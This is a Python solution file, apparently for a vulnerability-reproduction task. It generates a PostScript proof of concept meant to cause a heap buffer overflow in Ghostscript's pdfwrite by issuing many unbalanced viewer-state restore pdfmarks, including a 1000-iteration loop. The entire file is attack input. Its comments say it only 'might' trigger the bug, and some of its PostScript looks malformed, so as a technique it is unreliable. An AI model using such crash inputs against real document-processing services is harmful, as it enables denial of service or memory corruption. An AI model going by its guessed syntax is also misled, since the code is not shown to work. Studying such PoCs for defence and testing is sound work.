import os
import tempfile
import subprocess
import random
import string

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PostScript file that will trigger the heap buffer overflow
        # Based on the vulnerability description, we need to trigger a viewer state
        # restore when the viewer depth is 0
        
        # Create a PostScript program that manipulates the viewer state stack
        ps_content = """%!PS-Adobe-3.0
%%Creator: PoC Generator
%%Title: Heap Buffer Overflow PoC for pdfwrite
%%Pages: 1
%%EndComments

%% BeginSetup
/DeviceRGB setcolorspace
%%EndSetup

%% BeginProlog
/pdfmark where {pop} {userdict /pdfmark /cleartomark load put} ifelse

% Save initial viewer state
[ /ViewerState 1 /pdfmark

% Create a chain of operations that will leave viewer stack at depth 0
% but then attempt to restore
gsave
[ /ViewerState 0 /pdfmark  % This should pop the viewer state
grestore

% Now attempt to restore again when stack might be empty
% This should trigger the vulnerability
[ /ViewerState 0 /pdfmark

% Add more operations to increase chances of overflow
gsave
[ /ViewerState 1 /pdfmark
[ /ViewerState 0 /pdfmark
[ /ViewerState 0 /pdfmark  % Extra restore
grestore

% Create a pattern that maximizes the chance of overflow
% by repeatedly pushing and popping viewer state
0 1 1000 {
    pop
    [ /ViewerState 1 /pdfmark
    [ /ViewerState 0 /pdfmark
    [ /ViewerState 0 /pdfmark  % Extra restore each iteration
} for

% Force garbage collection or state changes
currentdict /PDFmark undef

% Create additional viewer state operations with unbalanced restores
[ /PageMode /UseOutlines /pdfmark
[ /Page 1 /pdfmark
[ /ViewerState 0 /pdfmark  % Attempt restore without corresponding save

% Generate many operations to fill heap and increase overflow chances
1000 {
    gsave
    [ /ViewerState [0] /pdfmark
    grestore
} repeat

% Final unbalanced restore attempt
[ /ViewerState 0 /pdfmark

% Create PDF objects that might trigger the vulnerable code path
[ /_objdef {pdfstateobj} /type /dict /OBJ pdfmark
[{pdfstateobj}] cvn /DOCINFO pdfmark

% Add more viewer state manipulations
[ /ViewerState null /pdfmark
[ /ViewerState 0 /pdfmark

%% Page 1
%%Page: 1 1
%%BeginPageSetup
%%EndPageSetup

% Draw something to ensure PDF generation
0 0 1 setrgbcolor
100 100 200 200 rectfill

% More viewer state operations during page content
[ /ViewerState 0 /pdfmark

%%PageTrailer
showpage

%%Trailer
% Final attempt to trigger the vulnerability during cleanup
[ /ViewerState 0 /pdfmark

%%EOF
"""

        # Convert to bytes
        return ps_content.encode('utf-8')